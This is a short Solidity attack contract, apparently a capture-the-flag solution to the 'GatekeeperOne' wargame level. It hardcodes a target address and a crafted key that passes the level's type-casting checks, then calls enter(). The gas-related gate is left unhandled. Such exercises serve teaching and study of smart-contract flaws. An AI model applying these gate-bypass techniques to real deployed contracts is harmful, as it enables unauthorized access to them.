// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Levels/GatekeeperOne.sol";

contract GatekeeperOneAttack {
  GatekeeperOne gatekeeperone = GatekeeperOne(0x5E3d0fdE6f793B3115A9E7f5EBC195bbeeD35d6C);
  bytes8 key = 0x1111111100004096;
  uint64 key2 = uint64(key);
  uint32 key3 = uint32(key2);

  modifier gateOne() {
    require(msg.sender != address(gatekeeperone));
    _;
  }

  function attack() gateOne public {
    require(uint32(uint64(key)) == uint16(uint64(key)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(key)) != uint64(key), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(key)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    gatekeeperone.enter(key);
    //return gasleft();
  }
}
